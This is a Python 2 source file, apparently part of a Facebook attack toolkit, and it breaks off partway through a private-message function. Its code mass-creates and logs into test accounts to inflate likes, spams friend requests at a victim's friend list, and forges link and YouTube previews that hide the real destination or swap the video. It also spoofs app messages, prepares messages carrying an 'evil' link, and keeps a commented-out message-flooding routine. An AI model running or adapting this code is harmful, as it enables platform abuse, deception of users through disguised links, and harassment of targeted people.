import sys,os
from getpass import getpass
from mainLib import *
import MyParser 
from urllib import urlencode
import simplejson as json
import database
from time import time,ctime,sleep
import pickle
import re
from handlers import *
import signal
import networkx as nx
import matplotlib.pyplot as plt
import numpy as np
import community
from networkx.drawing.nx_agraph import write_dot
from base64 import b64encode
import logging
from mechanize import Request

blocked = 0
masterCj = ''

def setGlobalLogginng():
    global globalLogging
    globalLogging = not globalLogging
    message = 'logging level set to %s' %globalLogging
    logs(message)
    raw_input(message + ' Press enter to continue')  

def setMail():
    email = raw_input("Enter the email: ")
    password = getpass("Enter the Password: ")
    return email, password


def login(email, password,state):
    global blocked
    cookieHandler = customCookies()
    # Empty the cookies
    cj.clear()
    # Access the login page to get the forms
    try:
        br.open('https://login.facebook.com/login.php')
    except mechanize.HTTPError as e:
        logs(str(e.code) + ' on login module')
        print str(e.code) + ' on login module'
        return -1
    except mechanize.URLError as e:
        logs(str(e.reason.args) + ' on login module')
        print str(e.reason.args) + ' on login module'
        return -1
    except:
        logs("Can't Access the login.php form")
        print "\rCan't Access the login.php form\r"
        return -1
        
    # Select the first form
    br.select_form(nr=0)
        
    # Set email and pass to the form
    try:
        br.form['email'] = email
        br.form['pass'] = password
    except:
        logs("Something bad happen.. Couldn't set email and password")
        print "\rSomething bad happen.. Couldn't set email and password\r"
        return -1
    
    # Send the form
    try:
        response = br.submit()
        if globalLogging:
            logs(response.read())
    except:
        logs('Fatal error while submitting the login form')
        print '\rFatal error while submitting the login form\r'
        return -1
    try:
        if cookieHandler.isLogged(cj) == True:
            #Checkpoint exists (?) 
            if cookieHandler.checkPoint(cj) == True:
                    blocked = 1
                    print 'Error - Checkpoint reached, your account may be blocked'
                    return -1
            # Assign cookies to array
            if state != 'real':
                cookieArray.append(cj._cookies)
        else:
            logs('Logging failed')
            print '\rLogging failed, check credentials and try again\r'
            return -1

    except signalCaught as e:
        deleteUser(10)
        message = '%s catch from login' %e.args[0]
        logs(str(message))
        print '%s \n' %message
        raw_input('Press enter to continue')
        return
        

    


def set_dtsg():
    n = 0
    flag = False
    try:
        response = br.open('https://www.facebook.com/')
        ''' Old dtsg set module.. 
        for form in br.forms():
            for control in form.controls: 
                if control.name == 'fb_dtsg':
                    flag = True
                    break
            n += 1
            if flag: break
        br.select_form(nr=n-1) '''
        
        if globalLogging:
            logs(response.read())

    
        
    except mechanize.HTTPError as e:
        logs(e.code)
        print e.code
    except mechanize.URLError as e:
        logs(e.reason.args)
        print e.reason.args    
    except:
        logs('Error in the dtsg set module')
        print '\rTrying to set dtsg \r'
    
    return workarounddtsg()

def workarounddtsg():
    try:
        response = br.open('https://www.facebook.com/')
        parse = response.read()
        match = re.search("\"fb_dtsg\"", parse)
        matchBis = re.search("value=\"",parse[match.end():])
        matchBisBis = re.search("\"",parse[match.end()+matchBis.end():])
        fb_dtsg = parse[match.end()+matchBis.end():match.end()+matchBis.end()+matchBisBis.start()]
        return fb_dtsg
    except:
        print 'error'
        return 0
    
def getC_user():
    # Get the c_user value from the cookie
    #Filtramos la cookie para obtener el nombre de usuario
    for cookie in cj:
        if (cookie.name == 'c_user'):
            c_user = cookie.value
            return str(c_user)
        
def createUser(number):
    
    fb_dtsg = set_dtsg()
    if (fb_dtsg == 0):
        print 'ERROR MOTHER FUCKER -_-'
    c_user = getC_user()
    
    arguments = {
        '__user' : c_user,
        '__a' : '1',
        '__dyn' : '798aD5z5zufEa0',
        '__req' : '4',
        'fb_dtsg' : fb_dtsg,
        'phstamp' : '16581655751108754574',
    }
    
    datos = urlencode(arguments)
    
    userRaw = []
    
    percentage = 0.0
    print 'Creating Test Users .. '
    for i in range(int(number)):
        try:
            response = br.open('https://www.facebook.com/ajax/whitehat/create_test_user.php',datos)
            userRaw.append(str(response.read()))
            
            percentage = (i * 100.0) / int(number)
            print '\rCompleted [%.2f%%]\r'%percentage,
            sleep(60)
        except mechanize.HTTPError as e:
            logs(str(e.code) + ' on iteration ' + str(i))
            print str(e.code) + ' on iteration %d'%i
        except mechanize.URLError as e:
            logs(str(e.reason.args) + ' on iteration ' + str(i))
            print str(e.reason.args) + ' on iteration %d'%i   
        except signalCaught as e:
            raise signalCaught(str(e.args[0])+' handling from createUser.. ')
        except:
            logs('Error in create module on iteration ' + str(i))
            print '\r                                                        \r',
            print '\rError in create module on iteration %d\r' %i,
            
        
    fullFlag = MyParser.parseData(userRaw)
    
    return fullFlag

'''    
def deleteUser():
    #Number is the max amount of test user accounts - Modify this value if the platform change
    number = 10 
    itemNum = 0
    users = []
    ids = []
    
    try:
        request = br.open("https://www.facebook.com/whitehat/accounts/")
        
    except mechanize.HTTPError as e:
        logs(str(e.code) + ' on deleteUser module')
        print str(e.code) + ' on deleteUser module'
    except mechanize.URLError as e:
        logs(str(e.reason.args) + ' on deleteUser module')
        print str(e.reason.args) + ' on deleteUser module'
    
    i = 0
    
    for form in br.forms():
        try:
            form.find_control('selected_test_users[]').items
            br.select_form(nr=i)
            break
        except:
            i += 1
            continue     
    try:
        for item in br.form.find_control('selected_test_users[]').items:
            users.append(item.name)
            br.form.find_control('selected_test_users[]').items[itemNum].selected = True
            itemNum += 1
        
        string = list(br.forms())[1]['fb_dtsg']
        i = 0
        
        dictioUser = {'fb_dtsg':str(string)}
        
        for parameters in users:
            if (i <= number):
                dictioUser['selected_test_users['+str(i)+']'] = parameters
            i += 1
        
        for elements in dictioUser:
            ids.append(str(dictioUser[str(elements)]))
        
        dictioUser['__user'] = str(getC_user())
        dictioUser['__a'] = '1'
        dictioUser['__dyn'] = '7n8ahyj35zolgDxqihXzA'
        dictioUser['__req'] = 'a'
        dictioUser['phstamp'] = '1658168991161218151159'
        
        datos = urlencode(dictioUser)
        response = br.open('https://www.facebook.com/ajax/whitehat/delete_test_users.php',datos)
        
        if globalLogging:
            logs(request.read())
            logs(response.read())
            
    except:
        logs('No users for eliminate')
        print '\rNo users for eliminate\r'
'''

def deleteUser(appId):
    ''' Selects the fb_dtsg form '''   
    fb_dtsg = set_dtsg()
    if (fb_dtsg == 0):
        print 'ERROR MOTHER FUCKER -_-'
    arguments = {
        '__user' : str(getC_user()),
        '__a' : '1',
        '__dyn' : '7w86i3S2e4oK4pomXWo5O12wYw',
        '__req' : '4',
        'fb_dtsg' : fb_dtsg,
        'ttstamp' : '26581718683108776783808786',
        '__rev' : '1409158'
        }
    testUserID =  database.getUsers()
    for n in len(testUserID[0]):
        arguments['test_user_ids['+str(n)+']'] = str(testUserID[0][n])      
    
    datos = urlencode(arguments)
    try:
        response = br.open('https://developers.facebook.com/apps/async/test-users/delete/?app_id='+appId,datos)
        
        if globalLogging:
            logs(response.read())

    except:
        logs('Error deleting users')
        print 'Error deleting users \n'

def massLogin():
    
    i = int(0)
    people = database.getUsersNotLogged()
    #Flush
    print '\r                                                        \r',
    
    loadPersistentCookie()
    
    for person in people:
        #login
        rsp = login(str(person[0]),str(person[3]),'test')
        #percentage
        i+=1
        percentage = (i * 100.0) / len(people)
        print '\rCompleted [%.2f%%]\r'%percentage,
        if rsp == -1:
            database.removeTestUsers(person[0])
    
    savePersistentCookie()               
            
def friendshipRequest():
    if (len(cookieArray) == 1):
        massLogin()
    userID = database.getUsers()
    for cookies in range(len(cookieArray)):
        cj._cookies = cookieArray[cookies]
        c_user = getC_user()
        users = 0
        for person in userID:
            '''---------------------Comienza el envio de solicitudes ... ----------------------- '''
            if users > cookies:
                sendRequest(person[0],c_user)
            users += 1

def sendRequest(userID,c_user):
    
    ''' Selects the fb_dtsg form '''   
    fb_dtsg = set_dtsg()
    if (fb_dtsg == 0):
        print 'ERROR MOTHER FUCKER -_-'
    arguments = {
        'to_friend' : userID,
        'action' : 'add_friend',
        'how_found' : 'profile_button',
        'ref_param' : 'none',
        'link_data[gt][profile_owner]' : userID,
        'link_data[gt][ref]' : 'timeline:timeline',
        'outgoing_id' : '',
        'logging_location' : '',
        'no_flyout_on_click' : 'true',
        'ego_log_data' : '',
        'http_referer' : '',
        '__user' : c_user,
        '__a' : '1',
        '__dyn' : '7n8aD5z5zu',
        '__req' : 'n',
        'fb_dtsg' : fb_dtsg,
        'phstamp' : '1658165688376111103320'
        }
        

    datos = urlencode(arguments)
    try:
        response = br.open('https://www.facebook.com/ajax/add_friend/action.php',datos)
        
        if globalLogging:
            logs(response.read())
            
        print 'Friend Request sent from %s to %s! \n' %(c_user,userID)
    except:
        logs('Error sending request ')
        print 'Error sending request \n'

def sendRequestToList(victim):
    
    root = 'dumps'
    directory = victim
    friends = []
    frieds_send = []
    count = 0
    number = raw_input('Insert the amount of requests to send: ')
    
    try:
        try:
            persons = open( os.path.join(root,directory,victim+".txt"),"rb" )
        except:
            logs('Friend file not found')
            print 'Friend file not found'
            return
        try:
            persons_send = open( os.path.join(root,directory,victim+"_friend_send.txt"),"rb")
            while True:
                linea = persons_send.readline()
                if not linea:
                    break
                frieds_send.append(linea.strip("\n\r"))
            persons_send.close()
            persons_send = open(os.path.join(root,directory,victim+"_friend_send.txt"),"ab")
        except:
            persons_send = open(os.path.join(root,directory,victim+"_friend_send.txt"),"wb")
        while True:
            linea = persons.readline()
            if not linea:
                break
            friends.append(linea.strip("\n\r"))
        
        i = 0.0
        percentage = 0.0
        
        print 'Sending friend requests'
        
                
        for userID in friends:        
            if userID not in frieds_send:
                #Escape condition
                if count > int(number):
                    persons_send.close()
                    return
                
                count += 1
                ''' Selects the fb_dtsg form '''   
                fb_dtsg = set_dtsg()
                if (fb_dtsg == 0):
                    print 'ERROR MOTHER FUCKER -_-'
                c_user = getC_user()
                    
                arguments = {
                    'to_friend' : userID,
                    'action' : 'add_friend',
                    'how_found' : 'profile_button',
                    'ref_param' : 'none',
                    'link_data[gt][profile_owner]' : userID,
                    'link_data[gt][ref]' : 'timeline:timeline',
                    'outgoing_id' : '',
                    'logging_location' : '',
                    'no_flyout_on_click' : 'true',
                    'ego_log_data' : '',
                    'http_referer' : '',
                    '__user' : c_user,
                    '__a' : '1',
                    '__dyn' : '7n8aD5z5zu',
                    '__req' : 'n',
                    'fb_dtsg' : fb_dtsg,
                    'ttstamp' : '265817211599516953787450107',
                    }
                
        
                datos = urlencode(arguments)
                try:
                    response = br.open('https://www.facebook.com/ajax/add_friend/action.php',datos)
                    
                    #percentage
                    percentage = (i * 100.0) / len(friends)
                    i+=1
                    print '\rCompleted [%.2f%%]\r'%percentage,
                            
                    if globalLogging:
                        logs(response.read())
                        
                    print 'Friend Request sent from %s to %s! \n' %(c_user,userID)
                    persons_send.write(userID+'\n')
                except:
                    logs('Error sending request ')
                    print 'Error sending request \n'
    except signalCaught as e:
        message = '%s catch from send request module' %e.args[0]
        logs(str(message))
        print '%s \n' %message
        persons_send.close()
        raw_input('Press enter to continue')
        return

def acceptRequest():
    initAccept()
    acceptIDS = MyParser.parsePending()
    while len(acceptIDS) != 0:
        for elements in acceptIDS:
            fb_dtsg = set_dtsg()
            if (fb_dtsg == 0):
                print 'ERROR MOTHER FUCKER -_-'               
            arguments = {
                'action' : 'confirm',
                'id' : elements,
                'ref' : '%2Freqs.php',
                '__user' : getC_user(),
                '__a' : '1',
                '__dyn' : '7n8aD5z5zu',
                '__req' : 'm',
                'fb_dtsg' : fb_dtsg,
                'phstamp' : '165816867997811675120'
                }
    
            datos = urlencode(arguments)
            response = br.open('https://www.facebook.com/requests/friends/ajax/ ',datos)
            
            if globalLogging:
                logs(response.read())
                
            print 'Accept done! \n'
            
        initAccept()
        acceptIDS = MyParser.parsePending()

def initAccept():
    f = open("respuesta.html","wb")
    response = br.open('https://www.facebook.com/friends/requests/')
        
    ''' Se guarda el output de la respuesta html para ser parseada y filtrar los ID's '''
    f.write(response.read())
    f.close()

def savePersistentCookie():
    f = open("cookiesObject","wb")
    pickle.dump(cookieArray,f)
    f.close()
    for element in cookieArray:
        cj._cookies = element
        for cookie in cj:
            if (cookie.name == 'c_user'):
                c_user = cookie.value
                database.setLogged(c_user)
    
def loadPersistentCookie():
    global cookieArray
    try:
        f = open("cookiesObject","r")
        cookieArray = pickle.load(f)
        i = 0
        ''' Se limpian las cookies que no sirven - se filtra el id para cambiar su estado a logged = 0 '''
        for cookie in cookieArray:
            cj._cookies = cookie
            for element in cj:
                if (element.name == 'checkpoint'):
                    strip = str(element.value).strip("%7B%22u%22%3A")
                    removeId = strip.split("%2C%22t%22%3A")[0]
                    database.setLoggedOut(removeId)
                    del cookieArray[i]
            i+=1
    except:
        return
            
def deleteAccounts():
    people = database.getUsers()
    for person in people:
        database.removeTestUsers(person[0]) 
    cookieArray[:] = [] 
    
def like(postId, quantity):
        
    signal.signal(signal.SIGINT, signal_handler)
    try:
        email,password = setMail()
        if (login(email,password,'real') is not -1):
            
            #Cookie of the real account
            masterCookie = cj._cookies
            times = int(quantity) / 10
            
            for i in range(times):
                cj._cookies = masterCookie
                #Check if users already exists
                if ( createUser(10) == -1 ):
                    #Delete existing users and re-execute the create module
                    deleteUser()
                    deleteAccounts()
                    createUser(10)
                    
                massLogin()
                #Percentage container
                percentage = 0.0
                j = 0.0
                total = len(cookieArray) * len(postId)
                #flush
                print '\r                                                        \r',
                
                for i in range(len(cookieArray)):
                    for post in range(len(postId)):
                        cj._cookies = cookieArray[i]
                        c_user = getC_user()
                        try:
                            fb_dtsg = set_dtsg()
                            if (fb_dtsg == 0):
                                print 'ERROR MOTHER FUCKER -_-'
                            arguments = {
                                'like_action' : 'true',
                                'ft_ent_identifier' : str(postId[post]),
                                'source' : '0',
                                'client_id' : str(c_user)+'%3A4047576437',
                                'rootid' : 'u_0_2o',
                                'giftoccasion' : '',
                                'ft[tn]' : '%3E%3D',
                                'ft[type]' : '20',
                                'nctr[_mod]' : 'pagelet_timeline_recent',
                                '__user' : c_user,
                                '__a' : '1',
                                '__dyn' : '7n8ahyj35ym3KiA',
                                '__req' : 'c',
                                'fb_dtsg' : fb_dtsg,
                                'phstamp' : '165816595797611370260',
                            }
                    
                            datos = urlencode(arguments)
                            response = br.open('https://www.facebook.com/ajax/ufi/like.php',datos)
                            
                            if globalLogging:
                                logs(response.read())
                            
                            percentage = (j * 100.0)/total
                            print '\r[%.2f%%] of likes completed\r' %(percentage), 
                            j+=1
                                
                        except mechanize.HTTPError as e:
                            print e.code
                            
                        except mechanize.URLError as e:
                                print e.reason.args  
                        except:
                            print 'Unknown error' 
                    
                cj._cookies = masterCookie
                deleteUser()
                deleteAccounts()
                
            raw_input('Finished like() module, press enter to continue')
    except signalCaught as e:
        deleteUser()
        message = '%s catch from create module' %e.args[0]
        logs(str(message))
        print '%s \n' %message
        raw_input('Press enter to continue')
        return
    
            
def appMessageSpoof(appId,link,picture,title,domain,description,comment):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'
            
        arguments = {
            'fb_dtsg' : br.form['fb_dtsg'],
            'preview' : '0',
            '_path' : 'feed',
            'app_id' : int(appId),
            'redirect_uri' : 'https://facebook.com',
            'display' : 'page',
            'link' : str(link),
            'picture' : str(picture),
            'name' : str(title),
            'caption' : str(domain),
            'description' : str(description),
            'from_post' : '1',
            'feedform_user_message' : str(comment),
            'publish' : 'Share',
            'audience[0][value]' : '80',
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/dialog/feed',datos)
        
        if globalLogging:
                logs(response.read())
                
    except:
        logs('Error en el modulo de appMessageSpoof()')
        print 'Error en el modulo de appMessageSpoof()\n'
   

def linkPreviewYoutube(link,videoLink,title,summary,comment,videoID, privacy):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'
            
        arguments = {
            'fb_dtsg' : fb_dtsg,
            'composer_session_id' : '38c20e73-acfc-411a-8313-47c095b01e42',
            'xhpc_context' : 'profile',
            'xhpc_ismeta' : '1',
            'xhpc_timeline' : '1',
            'xhpc_composerid' : 'u_0_29',
            'xhpc_targetid' : str(c_user),
            'clp' : '{ cl_impid : 65ac6257 , clearcounter :0, elementid : u_0_2n , version : x , parent_fbid :'+str(c_user)+'}',
            'xhpc_message_text' : str(comment),
            'xhpc_message' : str(comment),
            'aktion' : 'post',
            'app_id' : '2309869772',
            'attachment[params][urlInfo][canonical]' : str(videoLink),
            'attachment[params][urlInfo][final]' : str(videoLink),
            'attachment[params][urlInfo][user]' : str(link),
            'attachment[params][favicon]' : 'http://s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png',
            'attachment[params][title]' : str(title),
            'attachment[params][summary]' : str(summary),
            'attachment[params][images][0]' : 'http://i2.ytimg.com/vi/'+videoID+'/mqdefault.jpg?feature=og',
            'attachment[params][medium]' : '103',
            'attachment[params][url]' : str(videoLink),
            'attachment[params][video][0][type]' : 'application/x-shockwave-flash',
            'attachment[params][video][0][src]' : 'http://www.youtube.com/v/FxyecjOQXnI?autohide=1&version=3&autoplay=1',
            'attachment[params][video][0][width]' : '1280',
            'attachment[params][video][0][height]' : '720',
            'attachment[params][video][0][safe]' : '1',
            'attachment[type]' : '100',
            'link_metrics[source]' : 'ShareStageExternal',
            'link_metrics[domain]' : 'www.youtube.com',
            'link_metrics[base_domain]' : 'youtube.com',
            'link_metrics[title_len]' : '92',
            'link_metrics[summary_len]' : '160',
            'link_metrics[min_dimensions][0]' : '70',
            'link_metrics[min_dimensions][1]' : '70',
            'link_metrics[images_with_dimensions]' : '1',
            'link_metrics[images_pending]' : '0',
            'link_metrics[images_fetched]' : '0',
            'link_metrics[image_dimensions][0]' : '1280',
            'link_metrics[image_dimensions][1]' : '720',
            'link_metrics[images_selected]' : '1',
            'link_metrics[images_considered]' : '1',
            'link_metrics[images_cap]' : '10',
            'link_metrics[images_type]' : 'images_array',
            'composer_metrics[best_image_w]' : '398',
            'composer_metrics[best_image_h]' : '208',
            'composer_metrics[image_selected]' : '0',
            'composer_metrics[images_provided]' : '1',
            'composer_metrics[images_loaded]' : '1',
            'composer_metrics[images_shown]' : '1',
            'composer_metrics[load_duration]' : '1058',
            'composer_metrics[timed_out]' : '0',
            'composer_metrics[sort_order]' : '',
            'composer_metrics[selector_type]' : 'UIThumbPager_6',
            'backdated_date[year]' : '',
            'backdated_date[month]' : '',
            'backdated_date[day]' : '',
            'backdated_date[hour]' : '',
            'backdated_date[minute]' : '',
            'is_explicit_place' : '',
            'composertags_place' : '',
            'composertags_place_name' : '',
            'tagger_session_id' : '1394761251',
            'action_type_id[0]' : '',
            'object_str[0]' : '',
            'object_id[0]' : '',
            'og_location_id[0]' : '',
            'hide_object_attachment' : '0',
            'og_suggestion_mechanism' : '',
            'composertags_city' : '',
            'disable_location_sharing' : 'false',
            'composer_predicted_city' : '',
            'audience[0][value]' : privacy,
            'nctr[_mod]' : 'pagelet_timeline_recent',
            '__user' : str(c_user),
            '__a' : '1',
            '__dyn' : '7n8aqEAMBlCFUSt2u6aOGeExEW9ACxO4pbGA8AGGzCAjFDxCm',
            '__req' : 'm',
            'ttstamp' : '26581658074898653',
            '__rev' : '1161243',
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/updatestatus.php',datos)
        
        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    
    except mechanize.URLError as e:
            print e.reason.args              
    except:
        logs('Error en el modulo de linkPreviewYoutube()')
        print 'Error en el modulo de linkPreviewYoutube()\n'
        
def linkPreview(link,realLink,title,summary,comment,image,privacy):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'
            
        arguments = {
            'composer_session_id' : '787d2fec-b5c1-41fe-bbda-3450a03240c6',
            'fb_dtsg' : fb_dtsg,
            'xhpc_context' : 'profile',
            'xhpc_ismeta' : '1',
            'xhpc_timeline' : '1',
            'xhpc_composerid' : 'u_0_29',
            'xhpc_targetid' : str(c_user),
            'clp' : '{"cl_impid":"27c5e963","clearcounter":0,"elementid":"u_0_2n","version":"x","parent_fbid":'+str(c_user)+'}',
            'xhpc_message_text' : str(comment),
            'xhpc_message' : str(comment),
            'aktion' : 'post',
            'app_id' : '2309869772',
            'attachment[params][urlInfo][canonical]' : str(realLink),
            'attachment[params][urlInfo][final]' : str(realLink),
            'attachment[params][urlInfo][user]' : str(link),
            'attachment[params][favicon]' : str(realLink)+'/images/favicon.ico',
            'attachment[params][title]' : str(title),
            'attachment[params][summary]' : str(summary),
            'attachment[params][images][0]' : str(image),
            'attachment[params][medium]' : '106',
            'attachment[params][url]' : str(realLink),
            'attachment[type]' : '100',
            'link_metrics[source]' : 'ShareStageExternal',
            'link_metrics[domain]' : str(realLink),
            'link_metrics[base_domain]' : str(realLink),
            'link_metrics[title_len]' : '38',
            'link_metrics[summary_len]' : '38',
            'link_metrics[min_dimensions][0]' : '70',
            'link_metrics[min_dimensions][1]' : '70',
            'link_metrics[images_with_dimensions]' : '3',
            'link_metrics[images_pending]' : '0',
            'link_metrics[images_fetched]' : '0',
            'link_metrics[image_dimensions][0]' : '322',
            'link_metrics[image_dimensions][1]' : '70',
            'link_metrics[images_selected]' : '1',
            'link_metrics[images_considered]' : '5',
            'link_metrics[images_cap]' : '3',
            'link_metrics[images_type]' : 'ranked',
            'composer_metrics[best_image_w]' : '100',
            'composer_metrics[best_image_h]' : '100',
            'composer_metrics[image_selected]' : '0',
            'composer_metrics[images_provided]' : '1',
            'composer_metrics[images_loaded]' : '1',
            'composer_metrics[images_shown]' : '1',
            'composer_metrics[load_duration]' : '812',
            'composer_metrics[timed_out]' : '0',
            'composer_metrics[sort_order]' : '',
            'composer_metrics[selector_type]' : 'UIThumbPager_6',
            'backdated_date[year]' : '',
            'backdated_date[month]' : '',
            'backdated_date[day]' : '',
            'backdated_date[hour]' : '',
            'backdated_date[minute]' : '',
            'is_explicit_place' : '',
            'composertags_place' : '',
            'composertags_place_name' : '',
            'tagger_session_id' : '1394765332',
            'action_type_id[0]' : '',
            'object_str[0]' : '',
            'object_id[0]' : '',
            'og_location_id[0]' : '',
            'hide_object_attachment' : '0',
            'og_suggestion_mechanism' : '',
            'composertags_city' : '',
            'disable_location_sharing' : 'false',
            'composer_predicted_city' : '',
            'audience[0][value]' : privacy,
            'nctr[_mod]' : 'pagelet_timeline_recent',
            '__user' : str(c_user),
            '__a' : '1',
            '__dyn' : '7n8aqEAMBlCFUSt2u6aOGeExEW9ACxO4pbGA8AGGzCAjFDxCm',
            '__req' : 'h',
            'ttstamp' : '26581658074898653',
            '__rev' : '1161243'
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/updatestatus.php',datos)
        
        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    except mechanize.URLError as e:
            print e.reason.args  
                
    except:
        logs('Error en el modulo de linkPreview()')
        print 'Error en el modulo de linkPreview()\n'
        
def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'
            
        arguments = {
            'composer_session_id' : '8c4e1fa6-5f1f-4c16-b393-5c1ab4c3802b',
            'fb_dtsg' : fb_dtsg,
            'xhpc_context' : 'profile',
            'xhpc_ismeta' : '1',
            'xhpc_timeline' : '1',
            'xhpc_composerid' : 'u_0_23',
            'xhpc_targetid' : str(c_user),
            'clp' : '{"cl_impid":"4b4a8369","clearcounter":0,"elementid":"u_0_2h","version":"x","parent_fbid":'+str(c_user)+'}',
            'xhpc_message_text' : str(comment),
            'xhpc_message' : str(comment),
            'aktion' : 'post',
            'app_id' : '2309869772',
            'attachment[params][urlInfo][canonical]' : str(videoLink),
            'attachment[params][urlInfo][final]' : str(videoLink),
            'attachment[params][urlInfo][user]' : str(videoLink),
            'attachment[params][favicon]' : 'http://s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png',
            'attachment[params][title]' : str(title),
            'attachment[params][summary]' : str(summary),
            'attachment[params][images][0]' : 'http://i2.ytimg.com/vi/'+videoID+'/mqdefault.jpg?feature=og',
            'attachment[params][medium]' : '103',
            'attachment[params][url]' : str(videoLink),
            'attachment[params][video][0][type]' : 'application/x-shockwave-flash',
            'attachment[params][video][0][src]' : 'http://www.youtube.com/v/'+str(hijackedVideo)+'?version=3&autohide=1&autoplay=1',
            'attachment[params][video][0][width]' : '1920',
            'attachment[params][video][0][height]' : '1080',
            'attachment[params][video][0][safe]' : '1',
            'attachment[type]' : '100',
            'link_metrics[source]' : 'ShareStageExternal',
            'link_metrics[domain]' : 'www.youtube.com',
            'link_metrics[base_domain]' : 'youtube.com',
            'link_metrics[title_len]' : str(len(title)),
            'link_metrics[summary_len]' : str(len(summary)),
            'link_metrics[min_dimensions][0]' : '62',
            'link_metrics[min_dimensions][1]' : '62',
            'link_metrics[images_with_dimensions]' : '1',
            'link_metrics[images_pending]' : '0',
            'link_metrics[images_fetched]' : '0',
            'link_metrics[image_dimensions][0]' : '1920',
            'link_metrics[image_dimensions][1]' : '1080',
            'link_metrics[images_selected]' : '1',
            'link_metrics[images_considered]' : '1',
            'link_metrics[images_cap]' : '10',
            'link_metrics[images_type]' : 'images_array',
            'composer_metrics[best_image_w]' : '154',
            'composer_metrics[best_image_h]' : '154',
            'composer_metrics[image_selected]' : '0',
            'composer_metrics[images_provided]' : '1',
            'composer_metrics[images_loaded]' : '1',
            'composer_metrics[images_shown]' : '1',
            'composer_metrics[load_duration]' : '1184',
            'composer_metrics[timed_out]' : '0',
            'composer_metrics[sort_order]' : '',
            'composer_metrics[selector_type]' : 'UIThumbPager_6',
            'backdated_date[year]' : '',
            'backdated_date[month]' : '',
            'backdated_date[day]' : '',
            'backdated_date[hour]' : '',
            'backdated_date[minute]' : '',
            'is_explicit_place' : '',
            'composertags_place' : '',
            'composertags_place_name' : '',
            'tagger_session_id' : '1399663185',
            'action_type_id[0]' : '',
            'object_str[0]' : '',
            'object_id[0]' : '',
            'og_location_id[0]' : '',
            'hide_object_attachment' : '0',
            'og_suggestion_mechanism' : '',
            'composertags_city' : '',
            'disable_location_sharing' : 'false',
            'composer_predicted_city' : '',
            'audience[0][value]' : str(privacy),
            'nctr[_mod]' : 'pagelet_timeline_recent',
            '__user' : str(c_user),
            '__a' : '1',
            '__dyn' : '7n8ajEAMBlynzpQ9UoGya4Cq7pEsx6iWF29aGEZ94WpUpBxCFaG',
            '__req' : 'g',
            'ttstamp' : '265817289113541097355755354',
            '__rev' : '1241763',
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/updatestatus.php',datos)
        
        if globalLogging:
                logs(response.read())
        
    except:
        logs('Error en el modulo de linkPreviewYoutube()')
        print 'Error en el modulo de linkPreviewYoutube()\n'
        
#########################################
#Vulnerability no longer available 
#########################################
#def mailFlood(victim,message):
#    for cookies in cookieArray:
#        print cookies
#        cj._cookies = cookies
#        c_user = getC_user()
#        print str(c_user)+'\n'
#        try:
#            set_dtsg()
#            arguments = {
#                'message_batch[0][action_type]' : 'ma-type:user-generated-message',
#                'message_batch[0][thread_id]' : '',
#                'message_batch[0][author]' : 'fbid:'+str(c_user),
#                'message_batch[0][author_email]' : '',
#                'message_batch[0][coordinates]' : '',
#                'message_batch[0][timestamp]' : '1372638156169',
#                'message_batch[0][timestamp_absolute]' : 'Hoy',
#                'message_batch[0][timestamp_relative]' : '21:22',
#                'message_batch[0][timestamp_time_passed]' : '0',
#                'message_batch[0][is_unread]' : 'false',
#                'message_batch[0][is_cleared]' : 'false',
#                'message_batch[0][is_forward]' : 'false',
#                'message_batch[0][is_filtered_content]' : 'false',
#                'message_batch[0][spoof_warning]' : 'false',
#                'message_batch[0][source]' : 'source:titan:web',
#                'message_batch[0][body]' : str(message),
#                'message_batch[0][has_attachment]' : 'false',
#                'message_batch[0][html_body]' : 'false',
#                'message_batch[0][specific_to_list][0]' : 'email:'+str(victim),
#                'message_batch[0][specific_to_list][1]' : 'fbid:'+str(c_user),
#                'message_batch[0][forward_count]' : '0',
#                'message_batch[0][force_sms]' : 'true',
#                'message_batch[0][ui_push_phase]' : 'V3',
#                'message_batch[0][status]' : '0',
#                'message_batch[0][message_id]' : '<1372638156169:4202807677-4247395496@mail.projektitan.com>',
#                'message_batch[0][client_thread_id]' : 'pending:pending',
#                'client' : 'web_messenger',
#                '__user' : str(c_user),
#                '__a' : '1',
#                '__dyn' : '7n8ahyj35zsyzk9UmAEKWw',
#                '__req' : 'b',
#                'fb_dtsg' : br.form['fb_dtsg'],
#                'phstamp' : '16581661207177118751248'
#                }
#            
#            datos = urlencode(arguments)
#            response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php ',datos)
#        
#            if globalLogging:
#                logs(response.read())
#        
#        except mechanize.HTTPError as e:
#            print e.code
#        except mechanize.URLError as e:
#                print e.reason.args         
#        except:
#            print 'Ctrl+c SIGNAL Caught\n'
#            return


def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,evilLink):
    
    c_user = getC_user()
    
    try:
        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'
            
        arguments = {
            'message_batch[0][action_type]' : 'ma-type:user-generated-message',
            'message_batch[0][thread_id]' : '',
            'message_batch[0][author]' : 'fbid:'+c_user,
            'message_batch[0][author_email]' : '',
            'message_batch[0][coordinates]' : '',
            'message_batch[0][timestamp]' : '1394766424499',
            'message_batch[0][timestamp_absolute]' : 'Today',
            'message_batch[0][timestamp_relative]' : '12:07am',
            'message_batch[0][timestamp_time_passed]' : '0',
            'message_batch[0][is_unread]' : 'false',
            'message_batch[0][is_cleared]' : 'false',
            'message_batch[0][is_forward]' : 'false',
